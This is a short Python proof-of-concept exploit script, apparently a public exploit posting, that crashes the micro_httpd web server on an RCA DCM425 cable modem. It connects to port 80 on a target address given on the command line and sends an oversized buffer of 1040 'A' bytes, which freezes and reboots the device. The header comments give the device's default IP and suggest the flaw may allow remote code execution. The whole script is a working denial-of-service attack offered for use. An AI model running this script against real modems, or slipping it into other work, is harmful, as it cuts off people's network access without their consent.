#!/usr/bin/python
# Title: RCA DCM425 Cable Modem micro_httpd DoS/PoC
# Date: 02/27/10
# Author: ad0nis  ad0nis@hackermail.com
# Info: This script causes a Denial of Service on a DCM425 cable modem.
# Sending 1040 bytes causes a reboot of the device after a few seconds
# of it freezing up. I believe this may lead to remote code execution
# but I did not bother to test it further.

# By default, this cable modem has an IP address of 192.168.100.1

# There are two different but similar models of this router, the only
# difference I see between them is that one has an On/Off button on the
# front. The one I discovered this on is the one without a button. I
# have not tested this on the other model.

# Thanks to ShadowHatesYou for the inspiration to look closer at the
# little black box on my network.

import sys, socket
target = sys.argv[1]
buffer = ( "\x41" * 1040 )
print "Sending 1040 A's to" ,target, "on port 80\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target,80))
s.send(buffer)
s.close()